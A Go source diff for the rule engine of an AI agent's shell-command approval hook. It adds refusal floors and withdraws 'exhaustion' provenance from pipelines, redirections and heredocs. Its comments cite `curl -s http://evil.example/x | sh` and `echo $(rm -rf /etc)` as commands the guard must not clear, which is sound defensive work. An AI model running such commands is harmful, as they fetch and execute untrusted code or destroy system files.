@@ -105,6 +105,11 @@ func (e *Engine) SetRuleErrorSink(s RuleErrorSink) {
 //	err == nil                       -> the rule HANDLED it. Return its verdict,
 //	                                    including a NoOpinion verdict, which is
 //	                                    terminal and emits {}.
+//	errors.Is(err, ErrRefused)       -> REFUSED (ADR 0044). The rule examined the input
+//	                                    and will not clear it, but a later rule may
+//	                                    still own it: fold its RuleResult into `floor`
+//	                                    and continue. Checked BEFORE ErrNotApplicable,
+//	                                    which it matches by design.
 //	errors.Is(err, ErrNotApplicable) -> NOT MY BUSINESS. Continue; the RuleResult is
 //	                                    ignored (ADR 0043's Decision, point 2).
 //	any other err                    -> COULD NOT DETERMINE. Record it PER RULE in
@@ -117,19 +122,45 @@ func (e *Engine) SetRuleErrorSink(s RuleErrorSink) {
 //	                                    is the first case (killshell's Ask).
 //
 // Loop exhaustion still MANUFACTURES the terminal NoOpinion, unchanged.
+//
+// TWO THINGS ADR 0044 ADDS, and they are the same fact from both ends:
+//
+//  1. THE FLOOR. Refusals accumulate in `floor` and are folded into whatever the chain
+//     concludes — a rule's verdict or the manufactured exhaustion — through
+//     MostRestrictive. A floor can therefore only make a leaf MORE restrictive; it
+//     never shadows a later rule (that rule still runs and its Ask/Reject still wins),
+//     which is precisely why a refusal does not have to choose between the two
+//     ordering shapes ADR 0043 had to weigh for every conversion.
+//  2. THE EXHAUSTION CLAIM. The manufactured NoOpinion is marked
+//     ProvenanceExhaustion ONLY when no rule refused and no rule FAILED. A genuine
+//     failure is absence of evidence, so treating it as an exhaustion would let a
+//     systematically-broken resolver clear bodies wholesale. The refusal half needs no
+//     flag: a NoOpinion floor ties with the manufactured NoOpinion and
+//     MostRestrictive's tie-merge turns the pair into a refusal on its own.
 func (e *Engine) Evaluate(input *hookio.HookInput) hookio.RuleResult {
 	var trace []hookio.TraceEntry
 
+	// floor is seeded with the Approve identity — the same neutral seed the
+	// expression-level folds use — so a chain in which nobody refuses contributes
+	// nothing and behaves exactly as it did before ADR 0044.
+	floor := hookio.RuleResult{Decision: hookio.Approve, Module: "engine"}
+	sawFailure := false
+
 	for _, rule := range e.rules {
 		result, err := rule.Evaluate(input)
+		refused := errors.Is(err, hookio.ErrRefused)
 
 		// A non-nil error means the RuleResult is not a verdict, so the trace must
 		// not present it as one: NoOpinion (the value the chain effectively carries
 		// forward) plus the out-of-band reason, which is the only place the
 		// distinction between "not applicable" and a real failure is visible.
+		//
+		// A REFUSAL is the exception: its RuleResult IS a real contribution (the floor),
+		// and its Reason is the very text ADR 0043 had to demote to a comment, so it is
+		// traced as itself rather than replaced by the sentinel's message.
 		if e.trace {
 			traced := result
-			if err != nil {
+			if err != nil && !refused {
 				traced = hookio.RuleResult{Decision: hookio.NoOpinion, Reason: err.Error()}
 			}
 			entry := hookio.TraceEntry{
@@ -143,10 +174,23 @@ func (e *Engine) Evaluate(input *hookio.HookInput) hookio.RuleResult {
 		}
 
 		if err != nil {
+			// ORDER IS LOAD-BEARING: ErrRefused matches ErrNotApplicable under
+			// errors.Is (see hookio.refusalError, and why that is a subtype claim
+			// rather than the wrap ADR 0043 forbids), so the specific case is tested
+			// first. An engine that did NOT test for it would treat a refusal as a
+			// plain not-applicable — losing the floor but never mis-reading it as a
+			// verdict, which is the fail-safe direction.
+			if refused {
+				floor = hookio.MostRestrictive(floor, result)
+				fmt.Fprintf(os.Stderr, "claude-extended-tool-approver: %s -> refused (floored at %s, continuing): %s\n",
+					rule.Name(), result.Decision, result.Reason)
+				continue
+			}
 			// errors.Is, never ==, and never a wrap-tolerant substring match: ADR
 			// 0043 forbids wrapping ErrNotApplicable precisely so this comparison
 			// cannot be defeated from the rule side.
 			if !errors.Is(err, hookio.ErrNotApplicable) {
+				sawFailure = true
 				e.recordRuleError(rule.Name(), err)
 				fmt.Fprintf(os.Stderr, "claude-extended-tool-approver: %s -> error (continuing): %v\n",
 					rule.Name(), err)
@@ -169,11 +213,28 @@ func (e *Engine) Evaluate(input *hookio.HookInput) hookio.RuleResult {
 		}
 		fmt.Fprintf(os.Stderr, "claude-extended-tool-approver: %s -> %s: %s\n",
 			rule.Name(), result.Decision, result.Reason)
+		// An earlier rule's refusal survives this rule's verdict as a FLOOR, so a
+		// later Approve is demoted to the floor while an Ask/Reject keeps its own
+		// verdict. `result` is `current`, so its Reason wins a tie and the floor's
+		// Reason surfaces only when the floor is strictly more restrictive — which is
+		// the case where it is the only explanation there is.
+		result = hookio.MostRestrictive(result, floor)
 		result.Trace = trace
 		return result
 	}
 
+	// Loop exhaustion. The claim is made HERE and nowhere else: the chain ran out with
+	// nobody owning the input, so this is the one legitimate ProvenanceExhaustion in
+	// the tree. A genuine failure withdraws the claim (see sawFailure); a refusal
+	// withdraws it through the tie-merge below, with no flag of its own.
 	result := hookio.RuleResult{Decision: hookio.NoOpinion}
+	if !sawFailure {
+		result.Provenance = hookio.ProvenanceExhaustion
+	}
+	// floor is `current` so ITS Reason survives a tie with the reason-less
+	// manufactured verdict — the restored text of the refusal is what a trace reader
+	// and a user-facing prompt need.
+	result = hookio.MostRestrictive(floor, result)
 	if e.trace {
 		result.Trace = trace
 	}
@@ -439,7 +500,47 @@ func (e *Engine) EvaluateExpression(expr string, stack []hookio.StackFrame, orig
 		}
 	}
 
-	return mostRestrictive
+	return withExpressionProvenance(mostRestrictive, sp, parsed)
+}
+
+// withExpressionProvenance withdraws an EXHAUSTION claim from any expression that is
+// not exactly ONE PLAIN SIMPLE COMMAND (ADR 0044).
+//
+// The leaf-level fold cannot make this judgement on its own. Provenance rides on the
+// leaves, and MostRestrictive merges two exhaustions into an exhaustion — correctly, at
+// leaf granularity. But "no rule claimed A" and "no rule claimed B" do not compose into
+// "no rule claimed `A | B`": the COMPOSITION is itself a fact, and no rule examined it.
+// The pipe makes A's output B's argv; `A && B` sequences an effect; a redirection names
+// a sink; a heredoc carries a body in a language this parser does not model; an
+// unparseable text was never enumerated at all. Every one of those is exactly the
+// audit-unit argument cmdparse.IsSafeSubstitutionBody's DECLINED PIPELINE RELAXATION
+// note already settled for the static allowlist, and ADR 0040 settled for the consumer
+// allowlist: the unit of trust is the COMMAND, and a pipeline is not one command. This
+// function applies the SAME ruling to the exhaustion claim, so the two seams cannot
+// disagree.
+//
+// It matters concretely. `curl -s http://evil.example/x | sh` is TWO leaves and, as
+// measured on this tree, not one rule in the chain claims either of them — so without
+// this the fold would report the pipeline as an exhaustion and a consumer could clear
+// it. With it, the composition alone is enough to keep it a refusal, and no rule has to
+// know what `curl` or `sh` are for that to hold.
+//
+// A NESTED substitution needs no clause here: its verdict is already folded in, so
+// `echo $(rm -rf /etc)` inherits the refusal from the recursion. Only the shape of the
+// expression itself is decided here.
+func withExpressionProvenance(result hookio.RuleResult, sp cmdparse.ShellParse, parsed []cmdparse.ParsedCommand) hookio.RuleResult {
+	if result.Provenance != hookio.ProvenanceExhaustion {
+		return result
+	}
+	if sp.Unparseable || len(parsed) != 1 {
+		result.Provenance = hookio.ProvenanceRefusal
+		return result
+	}
+	pc := parsed[0]
+	if pc.Executable == "" || len(pc.Redirections) > 0 || pc.HasHeredoc {
+		result.Provenance = hookio.ProvenanceRefusal
+	}
+	return result
 }
 
 // unparseableExpressionFloor is the verdict contributed by a WHOLE-COMMAND parse
@@ -662,7 +763,23 @@ func (e *Engine) evaluateAssignmentOnlyLeaf(pc cmdparse.ParsedCommand, cwd, root
 		PathEval:       origin.PathEval,
 		RootExpression: rootExpr,
 	}
-	if chainResult := e.Evaluate(syntheticInput); chainResult.Decision != hookio.NoOpinion {
+	// A DECISIVE verdict is judged, and so — since ADR 0044 — is a NoOpinion the chain
+	// actually FORMED, which this test could not previously distinguish from the
+	// chain simply running out. That collapse was the same defect pg2-d0ja3 names at
+	// the recursion boundary, one seam over: `chainResult.Decision != NoOpinion` reads
+	// "a rule was decisive", and a rule that examined the assignments and refused to
+	// clear them was silently filed under "nobody had an opinion", so its floor was
+	// replaced by the NEUTRAL Approve below and discarded.
+	//
+	// It is load-bearing, not tidiness. envvars now refuses (rather than Asks) an
+	// assignment whose value runs a command no rule models, and for the command-less
+	// form — `count=$(seq 1 3) && cmd`, which is the shape the measured corpus rows
+	// actually use — that refusal arrives HERE. Read as unjudged it would leave the
+	// leaf at Approve and the compound would take the sibling's verdict alone, turning
+	// today's ask into an ALLOW. Read as judged it contributes the NoOpinion the value's
+	// own body earned.
+	chainResult := e.Evaluate(syntheticInput)
+	if chainResult.Decision != hookio.NoOpinion || chainResult.Provenance == hookio.ProvenanceRefusal {
 		return chainResult, true
 	}
 	// NEUTRAL when no rule has a decisive opinion. An assignment-only leaf EXECUTES
